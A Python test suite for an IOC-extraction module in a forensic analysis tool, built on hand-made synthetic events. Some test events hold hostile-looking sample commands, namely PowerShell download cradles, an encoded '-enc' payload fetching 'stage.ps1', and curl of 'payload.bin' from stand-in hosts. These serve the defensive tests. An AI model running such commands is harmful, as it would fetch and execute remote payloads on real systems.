"""Phase 6 tests: IOC extraction on synthetic events (no real data).

Findings here are hand-made and cite hand-made events, so each rule of the
extractor is tested on its own: what is in scope, what each IOC type accepts
and rejects, how occurrences are merged, and which links are (not) made.
"""

from __future__ import annotations

import copy
import random

import pytest
from detection_helpers import NOW, Factory, encode_command

from security.detection import IpPolicy
from security.ioc import IocConfig, cited_event_ids, extract_iocs
from security.models.schemas import (
    Confidence, DetectionResult, Finding, IocResult, IOCType, Severity)
from security.timeline import build_timeline

P = "C:\\Users\\Public\\a.ps1"


# ------------------------------------------------------------------ helpers
def make_finding(finding_id, events, context=None, user="ahmed", extra_ids=()):
    return Finding(
        finding_id=finding_id, rule_id="DET-002", title="t", severity=Severity.MEDIUM,
        confidence=Confidence.MEDIUM, device="PC-1", user=user, description="d", reason="r",
        detected_at=NOW, supporting_events=[e.event_id for e in events] + list(extra_ids),
        context=context or {})


def detection(*findings, case_id="C-1"):
    return DetectionResult(case_id=case_id, generated_at=NOW, event_count=0, config={},
                           findings=list(findings))


def extract(factory, findings, config=None, case_id="C-1"):
    return extract_iocs(factory.timeline(), detection(*findings, case_id=case_id), config)


def values(result, ioc_type):
    return {i.value for i in result.iocs if i.type is ioc_type}


def get(result, ioc_type, value):
    return next(i for i in result.iocs if i.type is ioc_type and i.value == value)


def only(result, ioc_type):
    [found] = [i for i in result.iocs if i.type is ioc_type]
    return found


def one(*events):
    return make_finding("F-001", events)


# --------------------------------------------------------------------- scope
class TestScope:
    def test_only_events_cited_by_a_finding_are_examined(self):
        f = Factory()
        cited = f.failed_logon(0, user="ahmed", ip="198.51.100.23")
        f.failed_logon(1, user="bob", ip="198.51.100.99")                 # not cited
        result = extract(f, [one(cited)])
        assert values(result, IOCType.IP) == {"198.51.100.23"}
        assert values(result, IOCType.USERNAME) == {"ahmed"}

    def test_benign_public_traffic_that_no_finding_cites_is_not_an_ioc(self):
        f = Factory()
        proc = f.process(0, 500, command_line="powershell.exe -ep bypass",
                         executable_path="C:\\Windows\\System32\\powershell.exe")
        f.connection(1, 9999, process_name="chrome.exe", remote="8.8.8.8")
        assert values(extract(f, [one(proc)]), IOCType.IP) == set()

    def test_records_listed_as_correlated_by_the_finding_are_cited_too(self):
        f = Factory()
        proc = f.process(0, 500, executable_path="C:\\Windows\\System32\\powershell.exe")
        conn = f.connection(5, 500, remote="203.0.113.77", hostname="c2.example.net")
        finding = make_finding("F-002", [proc], context={
            "correlated_records": [{"event_id": conn.event_id, "link": "network_connection"}]})
        result = extract(f, [finding])
        assert values(result, IOCType.IP) == {"203.0.113.77"}
        assert values(result, IOCType.DOMAIN) == {"c2.example.net"}
        assert get(result, IOCType.IP, "203.0.113.77").related_findings == ["F-002"]

    def test_cited_event_ids_helper(self):
        f = Factory()
        a, b = f.logon(0), f.logon(1)
        finding = make_finding("F-001", [a], context={"correlated_records": [
            {"event_id": b.event_id}, {"event_id": a.event_id}, {"link": "x"}]})
        assert cited_event_ids(finding) == [a.event_id, b.event_id]
        assert cited_event_ids(make_finding("F-002", [a])) == [a.event_id]

    def test_a_finding_citing_an_unknown_event_is_reported_and_skipped(self):
        f = Factory()
        good = f.failed_logon(0)
        result = extract(f, [make_finding("F-001", [good], extra_ids=["E-99999"])])
        assert values(result, IOCType.IP) == {"198.51.100.23"}
        assert result.data_gaps == ["F-001 cites event E-99999, which is not in the "
                                    "timeline; it was skipped"]

    def test_no_findings_means_no_iocs(self):
        f = Factory()
        f.failed_logon(0)
        result = extract(f, [])
        assert result.iocs == [] and result.findings == [] and result.counts_by_type == {}
        assert result.data_gaps == []


# ------------------------------------------------------------------ IP addresses
class TestIpAddresses:
    def test_logon_source_address(self):
        f = Factory()
        e = f.failed_logon(0, ip="8.8.8.8")
        ioc = only(extract(f, [one(e)]), IOCType.IP)
        assert ioc.value == "8.8.8.8" and ioc.source == "events.json"
        assert ioc.evidence_id == e.evidence_id
        assert ioc.occurrences[0]["field"] == "source_ip"
        assert "source address of a failed logon (RemoteInteractive)" in ioc.context
        assert ioc.attributes == {"ip_class": "public", "external": True}

    @pytest.mark.parametrize("address, kept", [
        ("8.8.8.8", True), ("10.0.0.5", True), ("172.16.9.9", True), ("203.0.113.9", True),
        ("100.64.0.1", True), ("127.0.0.1", False), ("169.254.1.1", False),
        ("224.0.0.1", False), ("0.0.0.0", False), ("::1", False), ("fe80::1", False)])
    def test_classes_kept_by_default(self, address, kept):
        f = Factory()
        e = f.failed_logon(0, ip=address)
        assert bool(values(extract(f, [one(e)]), IOCType.IP)) is kept

    def test_ip_classes_are_configurable(self):
        f = Factory()
        events = [f.failed_logon(0, ip=a, user=u) for a, u in
                  (("8.8.8.8", "a"), ("10.0.0.5", "b"), ("203.0.113.9", "c"), ("127.0.0.1", "d"))]
        finding = one(*events)
        assert values(extract(f, [finding], IocConfig(ip_classes=("public",))),
                      IOCType.IP) == {"8.8.8.8"}
        wide = IocConfig(ip_classes=("public", "private", "documentation", "loopback"))
        assert values(extract(f, [finding], wide), IOCType.IP) == {
            "8.8.8.8", "10.0.0.5", "203.0.113.9", "127.0.0.1"}

    @pytest.mark.parametrize("raw", ["not-an-ip", "999.1.1.1", "010.0.0.1", "1.2.3"])
    def test_an_invalid_address_is_a_gap_not_an_ioc(self, raw):
        f = Factory()
        e = f.failed_logon(0, ip=raw)
        result = extract(f, [one(e)])
        assert values(result, IOCType.IP) == set()
        assert result.data_gaps == [f"{e.evidence_id}: source_ip {raw!r} is not a valid "
                                    "IP address; not extracted"]

    @pytest.mark.parametrize("raw", [None, "", "  ", "-"])
    def test_a_missing_address_is_neither_an_ioc_nor_a_gap(self, raw):
        f = Factory()
        e = f.failed_logon(0, ip=raw)
        result = extract(f, [one(e)])
        assert values(result, IOCType.IP) == set() and result.data_gaps == []

    def test_addresses_in_command_and_script_text(self):
        f = Factory()
        proc = f.process(0, 500, command_line="ping 10.0.0.5 v2.3.4.5 999.9.9.9 1.2.3.4.5",
                         executable_path="C:\\Windows\\System32\\powershell.exe")
        script = f.script(1, 500, command="Test-Connection 8.8.4.4")
        result = extract(f, [one(proc, script)])
        assert values(result, IOCType.IP) == {"10.0.0.5", "8.8.4.4"}
        assert result.data_gaps == []                 # invalid text candidates are ignored
        assert get(result, IOCType.IP, "10.0.0.5").occurrences[0]["field"] == "command_line"

    def test_remote_address_of_a_connection_keeps_port_and_direction(self):
        f = Factory()
        e = f.connection(0, 500, remote="203.0.113.77", port=8443, direction="outbound")
        ioc = only(extract(f, [one(e)]), IOCType.IP)
        assert ioc.occurrences[0]["port"] == 8443
        assert ioc.occurrences[0]["direction"] == "outbound"
        assert "outbound connection by powershell.exe" in ioc.context

    def test_the_local_address_of_a_connection_is_never_extracted(self):
        f = Factory()
        e = f.connection(0, 500, remote="8.8.8.8")                    # local is 10.20.0.15
        assert values(extract(f, [one(e)]), IOCType.IP) == {"8.8.8.8"}

    def test_inbound_remote_address_is_the_peer(self):
        f = Factory()
        e = f.connection(0, 500, remote="198.51.100.5", direction="inbound")
        assert "inbound connection" in only(extract(f, [one(e)]), IOCType.IP).context

    @pytest.mark.parametrize("address, policy, external", [
        ("8.8.8.8", None, True), ("203.0.113.9", None, False), ("10.0.0.5", None, False),
        ("203.0.113.9", IpPolicy.synthetic_demo(), True),
        ("8.8.8.8", IpPolicy.from_classes(["private"]), False)])
    def test_external_attribute_follows_the_ip_policy(self, address, policy, external):
        f = Factory()
        e = f.failed_logon(0, ip=address)
        config = IocConfig(ip_policy=policy) if policy else None
        assert only(extract(f, [one(e)], config), IOCType.IP).attributes["external"] is external

    def test_ip_class_is_recorded_and_never_implies_malice(self):
        f = Factory()
        e = f.failed_logon(0, ip="203.0.113.9")
        ioc = only(extract(f, [one(e)]), IOCType.IP)
        assert ioc.attributes["ip_class"] == "documentation"

    def test_ipv6_and_ipv4_mapped_addresses_are_normalized(self):
        f = Factory()
        events = [f.failed_logon(0, ip="::ffff:8.8.4.4", user="a"),
                  f.failed_logon(1, ip="2001:4860:4860::8888", user="b")]
        assert values(extract(f, [one(*events)]), IOCType.IP) == {
            "8.8.4.4", "2001:4860:4860::8888"}

    def test_an_ip_host_in_a_url_gives_a_url_and_an_ip(self):
        f = Factory()
        e = f.process(0, 500, command_line="curl http://8.8.8.8/payload.bin",
                      executable_path="C:\\Windows\\System32\\x.exe")
        result = extract(f, [one(e)])
        assert values(result, IOCType.URL) == {"http://8.8.8.8/payload.bin"}
        assert "host of a URL" in get(result, IOCType.IP, "8.8.8.8").context


# ------------------------------------------------------------ domains and URLs
class TestDomainsAndUrls:
    def test_remote_hostname_is_normalized(self):
        f = Factory()
        e = f.connection(0, 500, remote="8.8.8.8", hostname="C2.Example.NET.")
        ioc = only(extract(f, [one(e)]), IOCType.DOMAIN)
        assert ioc.value == "c2.example.net"
        assert ioc.attributes == {"reserved_for_documentation": True}

    @pytest.mark.parametrize("host, reserved", [("evil.com", False), ("a.example.org", True)])
    def test_reserved_domains_are_labelled(self, host, reserved):
        f = Factory()
        e = f.connection(0, 500, hostname=host)
        assert only(extract(f, [one(e)]), IOCType.DOMAIN).attributes[
            "reserved_for_documentation"] is reserved

    @pytest.mark.parametrize("raw", ["no_underscore.com", "x", "1.2.3.4", "bad..dot.com"])
    def test_invalid_hostname_is_a_gap(self, raw):
        f = Factory()
        e = f.connection(0, 500, hostname=raw)
        result = extract(f, [one(e)])
        assert values(result, IOCType.DOMAIN) == set()
        assert result.data_gaps == [f"{e.evidence_id}: remote_hostname {raw!r} is not a "
                                    "valid domain name; not extracted"]

    @pytest.mark.parametrize("raw", [None, "", " "])
    def test_missing_hostname_is_silent(self, raw):
        f = Factory()
        e = f.connection(0, 500, hostname=raw)
        assert extract(f, [one(e)]).data_gaps == []

    def test_internationalized_domain_becomes_punycode(self):
        f = Factory()
        e = f.connection(0, 500, hostname="bücher.de")
        assert values(extract(f, [one(e)]), IOCType.DOMAIN) == {"xn--bcher-kva.de"}

    def test_url_gives_a_url_and_its_domain(self):
        f = Factory()
        e = f.script(0, 500, command="Invoke-WebRequest -Uri https://Files.Example.NET/a/b.ps1")
        result = extract(f, [one(e)])
        assert values(result, IOCType.URL) == {"https://files.example.net/a/b.ps1"}
        assert values(result, IOCType.DOMAIN) == {"files.example.net"}
        url = only(result, IOCType.URL)
        assert url.attributes == {"scheme": "https", "host": "files.example.net",
                                  "host_type": "domain", "credentials_removed": False}

    def test_url_credentials_are_removed_and_flagged(self):
        f = Factory()
        e = f.script(0, 500, command="iwr http://admin:S3cret@h.example.com:8080/x")
        result = extract(f, [one(e)])
        url = only(result, IOCType.URL)
        assert url.value == "http://h.example.com:8080/x"
        assert url.attributes["credentials_removed"] is True
        assert "S3cret" not in str(result.to_dict())

    def test_url_inside_an_encoded_command_is_found_through_decoding(self):
        f = Factory()
        payload = encode_command("Invoke-WebRequest http://h.example.com/stage.ps1")
        e = f.process(0, 500, command_line=f"powershell.exe -NoProfile -enc {payload}",
                      executable_path="C:\\Windows\\System32\\powershell.exe")
        result = extract(f, [one(e)])
        url = only(result, IOCType.URL)
        assert url.value == "http://h.example.com/stage.ps1"
        assert url.occurrences[0]["field"] == "command_line (decoded)"
        assert payload not in str(result.to_dict())            # the payload is never copied

    def test_decoding_can_be_switched_off(self):
        f = Factory()
        payload = encode_command("Invoke-WebRequest http://h.example.com/stage.ps1")
        e = f.process(0, 500, command_line=f"powershell.exe -enc {payload}",
                      executable_path="C:\\Windows\\System32\\powershell.exe")
        result = extract(f, [one(e)], IocConfig(decode_encoded_commands=False))
        assert result.iocs == [] or values(result, IOCType.URL) == set()

    def test_url_schemes_are_configurable(self):
        f = Factory()
        e = f.script(0, 500, command="iwr https://a.example.com/x; iwr ftp://b.example.com/y")
        assert values(extract(f, [one(e)]), IOCType.URL) == {
            "https://a.example.com/x", "ftp://b.example.com/y"}
        assert values(extract(f, [one(e)], IocConfig(url_schemes=("https",))),
                      IOCType.URL) == {"https://a.example.com/x"}

    def test_the_same_host_from_hostname_and_url_is_one_domain_ioc(self):
        f = Factory()
        conn = f.connection(0, 500, hostname="c2.example.net")
        script = f.script(1, 500, command="iwr https://c2.example.net/a")
        domain = only(extract(f, [one(conn, script)]), IOCType.DOMAIN)
        assert [o["field"] for o in domain.occurrences] == ["remote_hostname", "command"]

    def test_system_net_webclient_is_not_mistaken_for_a_domain(self):
        f = Factory()
        e = f.script(0, 500, command="(New-Object System.Net.WebClient).DownloadString($u)")
        assert extract(f, [one(e)]).iocs == [] or values(
            extract(f, [one(e)]), IOCType.DOMAIN) == set()


# --------------------------------------------------------------------- filenames
class TestFilenames:
    def test_path_in_a_command_line(self):
        f = Factory()
        e = f.process(0, 500, command_line=f"powershell.exe -File {P}",
                      executable_path="C:\\Windows\\System32\\powershell.exe")
        ioc = only(extract(f, [one(e)]), IOCType.FILENAME)
        assert ioc.value == "a.ps1"
        assert ioc.attributes == {"extension": "ps1", "paths": [P]}
        assert ioc.occurrences[0]["path"] == P

    def test_script_path_and_script_text(self):
        f = Factory()
        e = f.script(0, 500, command=f"& '{P}'", script_path="C:\\Users\\Public\\b.vbs",
                     host_application=f"powershell.exe -File {P}")
        assert values(extract(f, [one(e)]), IOCType.FILENAME) == {"a.ps1", "b.vbs"}

    @pytest.mark.parametrize("path, extracted", [
        ("C:\\Users\\Public\\x.ps1", True), ("C:\\Users\\Public\\x.EXE", True),
        ("C:\\Users\\Public\\x.docm", True), ("C:\\Users\\Public\\x.txt", False),
        ("C:\\Users\\Public\\x.csv", False), ("C:\\Users\\Public\\x", False),
        ("C:\\Windows\\System32\\wscript.exe", False), ("D:\\Program Files\\T\\t.exe", False),
        ("C:\\Windows\\Temp\\x.exe", True), ("C:\\Windows\\Tasks\\x.exe", True),
        ("C:\\Users\\bob\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\e.vbs", True),
        ("C:\\Users\\Public\\..\\..\\Windows\\System32\\x.exe", False),
        ("\\\\srv\\share\\tool.dll", True)])
    def test_extension_and_location_rules(self, path, extracted):
        f = Factory()
        e = f.script(0, 500, command="x", script_path=path)
        assert bool(values(extract(f, [one(e)]), IOCType.FILENAME)) is extracted

    def test_the_value_is_the_file_name_and_paths_are_kept(self):
        f = Factory()
        e1 = f.script(0, 500, command="x", script_path="C:\\Users\\Public\\a.ps1")
        e2 = f.script(1, 500, command="x", script_path="C:\\Users\\bob\\Downloads\\a.ps1")
        ioc = only(extract(f, [one(e1, e2)]), IOCType.FILENAME)
        assert ioc.value == "a.ps1"
        assert ioc.attributes["paths"] == ["C:\\Users\\Public\\a.ps1",
                                           "C:\\Users\\bob\\Downloads\\a.ps1"]
        assert len(ioc.occurrences) == 2

    def test_names_match_case_insensitively_but_keep_the_first_spelling(self):
        f = Factory()
        e1 = f.script(0, 500, command="x", script_path="C:\\Users\\Public\\Run.PS1")
        e2 = f.script(1, 500, command="x", script_path="C:\\users\\public\\run.ps1")
        ioc = only(extract(f, [one(e1, e2)]), IOCType.FILENAME)
        assert ioc.value == "Run.PS1" and len(ioc.attributes["paths"]) == 1

    def test_suspicious_extensions_are_configurable(self):
        f = Factory()
        e = f.script(0, 500, command="x", script_path="C:\\Users\\Public\\notes.txt")
        assert not values(extract(f, [one(e)]), IOCType.FILENAME)
        config = IocConfig(suspicious_extensions=("txt",))
        assert values(extract(f, [one(e)], config), IOCType.FILENAME) == {"notes.txt"}

    def test_a_quoted_path_with_spaces(self):
        f = Factory()
        quoted = 'powershell -File "C:\\Users\\Public\\My Tools\\a b.ps1"'
        e = f.process(0, 500, command_line=quoted,
                      executable_path="C:\\Windows\\System32\\powershell.exe")
        assert values(extract(f, [one(e)]), IOCType.FILENAME) == {"a b.ps1"}

    def test_a_file_record_cited_directly_gives_its_name_and_hash(self):
        f = Factory()
        e = f.file(0, P, sha256="b2" * 32)
        result = extract(f, [one(e)])
        assert values(result, IOCType.FILENAME) == {"a.ps1"}
        assert values(result, IOCType.HASH) == {"b2" * 32}


# ------------------------------------------------------------- hashes and links
class TestHashesAndFileLinks:
    def test_file_record_is_linked_by_exact_path_and_brings_its_hash(self):
        f = Factory()
        proc = f.process(0, 500, command_line=f"powershell.exe -File {P}",
                         executable_path="C:\\Windows\\System32\\powershell.exe")
        f.file(1, P, sha256="c3" * 32)                                  # NOT cited
        result = extract(f, [one(proc)])
        hash_ioc = only(result, IOCType.HASH)
        assert hash_ioc.value == "c3" * 32
        assert hash_ioc.related_findings == ["F-001"]                    # inherited by the path
        assert hash_ioc.attributes == {"algorithm": "sha256", "file_paths": [P]}
        assert hash_ioc.occurrences[0]["evidence_file"] == "files.json"
        name = only(result, IOCType.FILENAME)
        assert [o["evidence_file"] for o in name.occurrences] == ["processes.json", "files.json"]

    def test_the_link_ignores_case_and_slash_style(self):
        f = Factory()
        proc = f.process(0, 500, command_line=f"powershell.exe -File {P}",
                         executable_path="C:\\Windows\\System32\\powershell.exe")
        f.file(1, "c:/users/public/A.PS1", sha256="d4" * 32)
        assert values(extract(f, [one(proc)]), IOCType.HASH) == {"d4" * 32}

    @pytest.mark.parametrize("other_path", [
        "C:\\Users\\Public\\sub\\a.ps1",          # same name, different folder
        "C:\\Users\\bob\\a.ps1", "D:\\Users\\Public\\a.ps1", "C:\\Users\\Public\\a.ps1.bak"])
    def test_a_file_with_only_the_same_name_is_never_linked(self, other_path):
        f = Factory()
        proc = f.process(0, 500, command_line=f"powershell.exe -File {P}",
                         executable_path="C:\\Windows\\System32\\powershell.exe")
        f.file(1, other_path, sha256="e5" * 32)
        assert values(extract(f, [one(proc)]), IOCType.HASH) == set()

    def test_linking_can_be_switched_off(self):
        f = Factory()
        proc = f.process(0, 500, command_line=f"powershell.exe -File {P}",
                         executable_path="C:\\Windows\\System32\\powershell.exe")
        f.file(1, P, sha256="c3" * 32)
        result = extract(f, [one(proc)], IocConfig(link_file_records=False))
        assert values(result, IOCType.HASH) == set()
        assert len(only(result, IOCType.FILENAME).occurrences) == 1

    def test_a_linked_file_without_a_hash_adds_only_the_occurrence(self):
        f = Factory()
        proc = f.process(0, 500, command_line=f"powershell.exe -File {P}",
                         executable_path="C:\\Windows\\System32\\powershell.exe")
        f.file(1, P, sha256=None)
        result = extract(f, [one(proc)])
        assert values(result, IOCType.HASH) == set() and result.data_gaps == []
        assert len(only(result, IOCType.FILENAME).occurrences) == 2

    def test_a_linked_file_inherits_every_finding_that_cites_the_path(self):
        f = Factory()
        p1 = f.process(0, 500, command_line=f"powershell.exe -File {P}",
                       executable_path="C:\\Windows\\System32\\powershell.exe")
        p2 = f.process(5, 501, command_line=f"powershell.exe -File {P}",
                       executable_path="C:\\Windows\\System32\\powershell.exe")
        f.file(9, P, sha256="c3" * 32)
        result = extract(f, [make_finding("F-001", [p1]), make_finding("F-002", [p2])])
        assert only(result, IOCType.HASH).related_findings == ["F-001", "F-002"]

    @pytest.mark.parametrize("raw, algorithm, digest", [
        ("A1" * 32, "sha256", "a1" * 32), ("b2" * 20, "sha1", "b2" * 20),
        ("d41d8cd98f00b204e9800998ecf8427e", "md5", "d41d8cd98f00b204e9800998ecf8427e")])
    def test_algorithms_are_detected_and_hashes_are_lowercased(self, raw, algorithm, digest):
        f = Factory()
        e = f.file(0, P, sha256=raw)
        ioc = only(extract(f, [one(e)]), IOCType.HASH)
        assert (ioc.value, ioc.attributes["algorithm"]) == (digest, algorithm)

    @pytest.mark.parametrize("raw", ["zz" * 32, "0" * 64, "abc", "a1" * 31])
    def test_an_invalid_hash_is_a_gap_not_an_ioc(self, raw):
        f = Factory()
        e = f.file(0, P, sha256=raw)
        result = extract(f, [one(e)])
        assert values(result, IOCType.HASH) == set()
        assert any("is not a valid hash" in g for g in result.data_gaps)

    def test_a_missing_hash_is_silent(self):
        f = Factory()
        e = f.file(0, P, sha256=None)
        assert extract(f, [one(e)]).data_gaps == []


# ---------------------------------------------------------------------- processes
class TestProcesses:
    def test_executable_outside_system_folders_is_an_ioc_with_its_hash(self):
        f = Factory()
        e = f.process(0, 500, name="svc.exe", command_line="svc.exe", user="ahmed",
                      executable_path="C:\\Users\\Public\\svc.exe", sha256="a1" * 32)
        result = extract(f, [one(e)])
        proc = only(result, IOCType.PROCESS)
        assert proc.value == "C:\\Users\\Public\\svc.exe"
        assert proc.attributes == {"basis": "executable path outside protected system folders"}
        assert proc.occurrences[0]["pid"] == 500 and "started by ahmed" in proc.context
        assert only(result, IOCType.HASH).attributes["file_paths"] == [proc.value]

    def test_a_protected_system_binary_is_not_an_ioc_and_neither_is_its_hash(self):
        f = Factory()
        e = f.process(0, 500, name="wscript.exe", command_line="wscript.exe x",
                      executable_path="C:\\Windows\\System32\\wscript.exe", sha256="a1" * 32)
        result = extract(f, [one(e)])
        assert values(result, IOCType.PROCESS) == set() == values(result, IOCType.HASH)

    def test_a_system_name_in_the_wrong_folder_is_caught(self):
        f = Factory()
        e = f.process(0, 500, name="svchost.exe", command_line="svchost.exe",
                      executable_path="C:\\Users\\Public\\svchost.exe")
        assert values(extract(f, [one(e)]), IOCType.PROCESS) == {"C:\\Users\\Public\\svchost.exe"}

    def test_unknown_name_without_a_path_is_judged_by_name(self):
        f = Factory()
        e = f.process(0, 500, name="mimic.exe", command_line="mimic.exe", sha256="a1" * 32)
        result = extract(f, [one(e)])
        proc = only(result, IOCType.PROCESS)
        assert proc.value == "mimic.exe" and "path unavailable" in proc.attributes["basis"]
        assert only(result, IOCType.HASH).attributes["file_paths"] == []

    def test_known_name_without_a_path_is_not_an_ioc_but_the_gap_is_reported(self):
        f = Factory()
        e1 = f.process(0, 500, name="powershell.exe", command_line="powershell.exe")
        e2 = f.process(1, 501, name="cmd.exe", command_line="cmd.exe")
        result = extract(f, [one(e1, e2)])
        assert values(result, IOCType.PROCESS) == set()
        assert result.data_gaps == [
            "2 process record(s) cited by findings have no executable_path, so they were "
            f"judged by name only: {e1.evidence_id}, {e2.evidence_id}"]

    def test_known_process_list_is_configurable(self):
        f = Factory()
        e = f.process(0, 500, name="mimic.exe", command_line="mimic.exe")
        config = IocConfig(known_system_processes=("mimic.exe",))
        assert values(extract(f, [one(e)], config), IOCType.PROCESS) == set()

    def test_system_path_prefixes_are_configurable(self):
        f = Factory()
        e = f.process(0, 500, name="t.exe", command_line="t.exe",
                      executable_path="D:\\Tools\\t.exe")
        assert values(extract(f, [one(e)]), IOCType.PROCESS) == {"D:\\Tools\\t.exe"}
        config = IocConfig(system_path_prefixes=("\\tools\\",))
        assert values(extract(f, [one(e)], config), IOCType.PROCESS) == set()


# ---------------------------------------------------------------------- usernames
class TestUsernames:
    def test_roles_of_actor_target_and_member(self):
        f = Factory()
        created = f.account(0, actor="ahmed", target="svc_new")
        added = f.group_add(1, member="svc_new", group="Administrators", actor="ahmed")
        result = extract(f, [one(created, added)])
        assert values(result, IOCType.USERNAME) == {"ahmed", "svc_new"}
        assert get(result, IOCType.USERNAME, "svc_new").attributes["roles"] == [
            "account added to group 'Administrators'", "account that was created"]
        assert "account that created an account" in get(
            result, IOCType.USERNAME, "ahmed").attributes["roles"]

    @pytest.mark.parametrize("name", ["WIN-PC-01$", "SYSTEM", "Local Service",
                                      "NETWORK SERVICE", "ANONYMOUS LOGON", "-", "", "  "])
    def test_machine_and_system_accounts_are_ignored(self, name):
        f = Factory()
        e = f.failed_logon(0, user=name)
        assert values(extract(f, [one(e)]), IOCType.USERNAME) == set()

    def test_no_user_is_not_an_ioc(self):
        f = Factory()
        e = f.connection(0, 500, user=None)
        assert values(extract(f, [one(e)]), IOCType.USERNAME) == set()

    def test_names_merge_case_insensitively(self):
        f = Factory()
        events = [f.failed_logon(0, user="Ahmed"), f.logon(1, user="ahmed", ip="198.51.100.23")]
        ioc = only(extract(f, [one(*events)]), IOCType.USERNAME)
        assert ioc.value == "Ahmed" and len(ioc.occurrences) == 2

    def test_ignored_names_are_configurable(self):
        f = Factory()
        e = f.failed_logon(0, user="svc_scan")
        assert values(extract(f, [one(e)], IocConfig(ignored_usernames=("svc_scan",))),
                      IOCType.USERNAME) == set()


# ------------------------------------------------------------------- aggregation
class TestAggregation:
    def test_one_ioc_per_value_with_every_occurrence(self):
        f = Factory()
        a = f.failed_logon(0, ip="8.8.8.8")
        b = f.failed_logon(10, ip="8.8.8.8")
        c = f.logon(20, ip="8.8.8.8")
        ioc = only(extract(f, [one(a, b, c)]), IOCType.IP)
        assert [o["event_id"] for o in ioc.occurrences] == [a.event_id, b.event_id, c.event_id]
        assert ioc.evidence_id == a.evidence_id and ioc.source == "events.json"
        assert ioc.timestamp == ioc.first_seen == a.timestamp and ioc.last_seen == c.timestamp
        assert ioc.context.endswith("(+2 more occurrence(s))")

    def test_a_value_seen_in_several_files_keeps_each_source(self):
        f = Factory()
        net = f.connection(0, 500, remote="8.8.8.8")
        proc = f.process(1, 500, command_line="ping 8.8.8.8",
                         executable_path="C:\\Windows\\System32\\powershell.exe")
        ioc = only(extract(f, [one(net, proc)]), IOCType.IP)
        assert [o["evidence_file"] for o in ioc.occurrences] == ["network.json", "processes.json"]

    def test_related_findings_are_the_union_over_all_occurrences(self):
        f = Factory()
        a = f.failed_logon(0, ip="8.8.8.8")
        b = f.logon(5, ip="8.8.8.8")
        result = extract(f, [make_finding("F-001", [a]), make_finding("F-002", [b])])
        assert only(result, IOCType.IP).related_findings == ["F-001", "F-002"]

    def test_ids_follow_first_seen_then_type_then_value(self):
        f = Factory()
        late_ip = f.failed_logon(50, ip="8.8.8.8", user="zed")
        early = f.connection(10, 500, remote="1.1.1.1", hostname="a.example.net", user="amy")
        result = extract(f, [one(late_ip, early)])
        order = [(i.ioc_id, i.type.value, i.value) for i in result.iocs]
        assert order == [("IOC-001", "ip", "1.1.1.1"), ("IOC-002", "domain", "a.example.net"),
                         ("IOC-003", "username", "amy"), ("IOC-004", "ip", "8.8.8.8"),
                         ("IOC-005", "username", "zed")]

    def test_findings_receive_their_ioc_ids_without_changing_the_input(self):
        f = Factory()
        a = f.failed_logon(0, ip="8.8.8.8")
        b = f.failed_logon(5, ip="1.1.1.1", user="bob")
        det = detection(make_finding("F-001", [a]), make_finding("F-002", [b]))
        before = copy.deepcopy(det.to_dict())
        result = extract_iocs(f.timeline(), det)
        assert [x.iocs for x in result.findings] == [["IOC-001", "IOC-002"],
                                                     ["IOC-003", "IOC-004"]]
        assert det.to_dict() == before and all(x.iocs == [] for x in det.findings)
        result.findings[0].supporting_events.clear()
        assert det.findings[0].supporting_events                      # independent copies

    def test_counts_and_config_are_reported(self):
        f = Factory()
        e = f.failed_logon(0, ip="8.8.8.8")
        result = extract(f, [one(e)], IocConfig(ip_classes=("public",)))
        assert result.counts_by_type == {"ip": 1, "username": 1}
        assert result.config["ip_classes"] == ["public"]
        assert isinstance(result, IocResult) and result.case_id == "C-1"

    def test_result_is_json_serializable(self):
        import json
        f = Factory()
        e = f.failed_logon(0, ip="8.8.8.8")
        payload = json.loads(json.dumps(extract(f, [one(e)]).to_dict()))
        assert payload["iocs"][0]["first_seen"] == "2026-10-08T07:00:00Z"
        assert payload["iocs"][0]["type"] == "ip"

    def test_every_occurrence_points_at_a_real_timeline_entry(self):
        f = Factory()
        events = [f.failed_logon(0, ip="8.8.8.8"), f.connection(1, 500, hostname="a.example.net"),
                  f.script(2, 500, command=f"iwr https://a.example.net/x; & {P}")]
        timeline = f.timeline()
        result = extract_iocs(timeline, detection(one(*events)))
        for ioc in result.iocs:
            for occurrence in ioc.occurrences:
                entry = timeline.get_by_event_id(occurrence["event_id"])
                assert entry.evidence_id == occurrence["evidence_id"]
                assert entry.evidence_file == occurrence["evidence_file"]
        assert result.iocs

    def test_input_order_does_not_matter(self):
        f = Factory()
        events = [f.failed_logon(i * 7, ip=f"8.8.8.{i + 1}", user=f"u{i}") for i in range(6)]
        events += [f.connection(50, 500, hostname="a.example.net"),
                   f.script(60, 500, command=f"iwr https://a.example.net/x; & {P}")]
        finding = one(*events)
        expected = extract(f, [finding]).to_dict()
        for seed in range(5):
            shuffled = list(f.events)
            random.Random(seed).shuffle(shuffled)
            again = extract_iocs(build_timeline(shuffled, case_id="C-1"), detection(finding))
            assert again.to_dict() == expected

    def test_extraction_does_not_modify_the_timeline(self):
        f = Factory()
        e = f.script(0, 500, command=f"iwr https://a.example.net/x; & {P}")
        timeline = f.timeline()
        before = copy.deepcopy(timeline.to_dict())
        extract_iocs(timeline, detection(one(e)))
        assert timeline.to_dict() == before


class TestInputValidation:
    def test_wrong_types(self):
        f = Factory()
        f.logon(0)
        with pytest.raises(TypeError, match="Timeline"):
            extract_iocs("timeline", detection())
        with pytest.raises(TypeError, match="DetectionResult"):
            extract_iocs(f.timeline(), {"findings": []})
        with pytest.raises(TypeError, match="IocConfig"):
            extract_iocs(f.timeline(), detection(), {"ip_classes": ["public"]})

    def test_timeline_and_detection_must_be_the_same_case(self):
        f = Factory()
        f.logon(0)
        with pytest.raises(ValueError, match="differs from the detection case"):
            extract_iocs(f.timeline(), detection(case_id="OTHER"))

    def test_empty_timeline_is_a_clean_negative(self):
        empty = build_timeline([], case_id="C-1")
        result = extract_iocs(empty, detection())
        assert result.iocs == [] and result.data_gaps == []
